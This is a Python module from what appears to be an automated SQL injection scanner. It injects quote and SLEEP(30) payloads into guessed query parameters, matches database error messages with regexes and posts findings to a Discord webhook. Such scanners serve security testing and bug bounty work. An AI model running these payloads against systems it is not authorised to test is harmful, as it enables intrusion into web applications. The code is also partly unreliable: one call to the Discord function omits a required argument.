import re
import warnings
import requests
import core.ParseParams as ParseParams
import core.ThreadedStart as ThreadedStart
from discord_webhook import DiscordWebhook, DiscordEmbed

sqli_regex = ["SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClient.|mysqli_error|mysqli_query",
              "PostgreSQL.*ERROR|Warning.*Wpg_.*|valid PostgreSQL resultNpgsql.",
              "Microsoft Access Driver|JET Database Engine|Access Database Engine",
              "ORA-[0-9][0-9][0-9][0-9]|Oracle error|Oracle.*Driver|Warning.*Woci_.*|Warning.*Wora_.*",
              "CLI Driver.*DB2|DB2 SQL error|bdb2_w+",
              "SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|SQLITE_ERROR",
              "(?i)Warning.*sybase.*|Sybase message|Sybase.*Server message.*"]

sqli_timebases = ["- SLEEP(30);", "asdf' OR SLEEP(30) OR 'asdf", "asdf\" OR SLEEP(30) OR \"asdf"]
sqli_error     = ["'", "\""]

endpoints = []
hidden_params = []

def sendDiscordMessage(message, description_message):
    if ThreadedStart.discord_hook != "":
        hook = DiscordWebhook(url=ThreadedStart.discord_hook)
        embed = DiscordEmbed(title='[POTENCIAL SQLI]', description=description_message, color="1a1a1a")
        hook.add_embed(embed)
        embed.add_embed_field(name='URL:', value=message)
        hook.execute()

def parseParams(param_file):
    global hidden_params
    hidden_params = ParseParams.parseParams(param_file)

def sql_error_detector(endpoint, endpoint_index, auth_cookie):
    warnings.filterwarnings("ignore")

    global hidden_params
    global sqli_error
    global sqli_regex

    endpoint = endpoint.replace("\n", "")
    temp_params = []
    vulnerable = False
    time = 0
    url = ""
    i = 1

    for payload in sqli_error:
        for param in hidden_params:
            param = param.replace("\n", "")

            if i <= 1:
                if "?" in endpoint:
                    url = endpoint + "&" + param + "=" + payload
                    i += 1
                else:
                    url = endpoint + "?" + param + "=" + payload
                    i += 1
            else:
                url = url + "&" + param + "=" + payload
                i += 1

            temp_params.append(param)

            if i == 32:

                if str(auth_cookie) != "{}":
                    response = requests.get(url, cookies=auth_cookie, verify=False)
                else:
                    response = requests.get(url, verify=False)

                for regex in sqli_regex:
                    temp = re.compile(regex)
                    if re.search(temp, response.text) or response.status_code == 500:
                        for x in temp_params:

                            url = endpoint + "?" + x + "=" + payload

                            if str(auth_cookie) != "{}":
                                response = requests.get(url, cookies=auth_cookie, verify=False)
                            else:
                                response = requests.get(url, verify=False)

                            if re.search(temp, response.text):
                                sendDiscordMessage(endpoint + "?" + x + "=" + payload, "The following URL return's a SQL Error message !")
                                vulnerable = True
                            elif response.status_code == 500:
                                sendDiscordMessage(endpoint + "?" + x + "=" + payload, "The following URL return's a `500 status code`. Check more in depth manually :)")
                                vulnerable = True

                            if vulnerable:
                                with open("results.sqli.txt", "a") as sqli_file:
                                    sqli_file.write("[POTENCIAL SQLI] " + endpoint + "?" + x + "=" + payload + " --> " + regex + "\n")
                                return True

                i = 0
    return False


def sql_timebase_detector(endpoint, endpoint_index, auth_cookie):
    warnings.filterwarnings("ignore")

    global hidden_params
    global sqli_timebases

    endpoint = endpoint.replace("\n", "")

    temp_params = []
    time = 0
    final_time = 0
    url = ""
    i = 1

    for payload in sqli_timebases:
        for param in hidden_params:
            param = param.replace("\n", "")

            if i <= 1:
                if "?" in endpoint:
                    url = endpoint + "&" + param + "=" + payload
                    i += 1
                else:
                    url = endpoint + "?" + param + "=" + payload
                    i += 1
            else:
                url = url + "&" + param + "=" + payload
                i += 1

            temp_params.append(param)

            if i == 32:
                if str(auth_cookie) != "{}":
                    response = requests.get(url, cookies=auth_cookie, verify=False)
                else:
                    response = requests.get(url, verify=False)

                time = response.elapsed.total_seconds()

                if time >= 30:
                    for x in temp_params:
                        url = endpoint + "?" + x + "=" + payload

                        if str(auth_cookie) != "{}":
                            response = requests.get(url, cookies=auth_cookie, verify=False)
                        else:
                            response = requests.get(url, verify=False)

                        final_time = response.elapsed.total_seconds()

                        if final_time >= 30:
                            sendDiscordMessage(endpoint + "?" + x + "=" + payload)
                            with open("results.sqli.txt", "a") as sqli_file:
                                sqli_file.write("[ENDPOINT] " + endpoint + "?" + x + "=" + payload + "\n")
                            return True

                temp_params.clear()
                i = 0
